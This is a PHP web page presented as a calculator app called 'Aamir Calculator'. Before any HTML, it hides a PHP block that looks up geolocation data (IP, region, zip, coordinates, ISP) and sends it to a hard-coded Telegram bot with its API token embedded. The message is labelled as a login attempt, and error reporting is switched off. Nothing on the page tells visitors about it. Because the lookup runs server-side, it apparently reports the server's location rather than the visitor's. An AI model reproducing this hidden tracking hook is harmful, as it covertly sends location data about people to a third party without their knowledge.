<?php

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: ip-api.com',
'Accept: ext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);

$ip = $fim['query'];
$region = $fim['region'];
$city = $fim['city'];
$zip = $fim['zip'];

$lat = $fim['lat'];
$lon = $fim['lon'];

$isp = $fim['isp'];


date_default_timezone_set("Asia/kolkata");
error_reporting(0);

$time = date("h:i a", time());


$message = "USER INFO \n Ip : $ip \n Region : $region \n Zip: $zip \n Lat and lon: $lat - $lon \n Isp: $isp \n Tried Login at $time IST";

$chat_id= 1569782681; // replace with your userid


send_message($chat_id,"$message");


function send_message($chat_id, $message){
        $text = urlencode($message);
        $apiToken = "1475814914:AAHyD4zRI20lZ2p-tESvBx3zeBP3XFZPHZQ";
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
    }
?>

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Aamir Calculator</title>
  <link href='https://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>

<link href='https://fonts.googleapis.com/css?family=Josefin+Sans' rel='stylesheet' type='text/css'><link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css'><link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div class='container'>
  <div id='calculator'>

    <!-- TITLE -->

    <div id='title' class='text-center'>
      <h5><b>AAMIR CALCULATOR</b></h5>
    </div>

    <!-- ENTRY BOX -->

    <div id='entrybox' class='text-right'>
      <div id='entry'>
        <p id='answer'>0</p>
      </div>
      <div id='history'>
        <p>0</p>
      </div>
    </div>

    <!-- BUTTONS -->

    <div id='buttons'>

      <button class='red' value='ac'>AC</button>
      <button class='red' value='ce'>CE</button>
      <button value='/'>&divide;</button>
      <button value='*'>x</button>

      <button value='7'>7</button>
      <button value='8'>8</button>
      <button value='9'>9</button>
      <button value='-'>-</button>

      <button value='4'>4</button>
      <button value='5'>5</button>
      <button value='6'>6</button>
      <button value='+'>+</button>


      <button value='1'>1</button>
      <button value='2'>2</button>
      <button value='3'>3</button>
      <button class='invisible'>N</button>

      <button id='zeroButton' value='0'>0</button>
      <button value='.'>.</button>
      <button id='equalButton' value='='>=</button>

    </div>
    <!-- end buttons -->
    <div id='tester'></div>
  </div>
  <!-- end calculator -->
</div>
<!-- end container -->

<footer id="footer" class="text-center">
  <div class="container">
    Maked By
    <a href="https://t.me/Aamir_2x" target="_blank">
        Aamir</a>
  </div>
</footer>
<!-- partial -->
  <script src='https://code.jquery.com/jquery-2.2.4.min.js'></script><script  src="./script.js"></script>

</body>
</html>
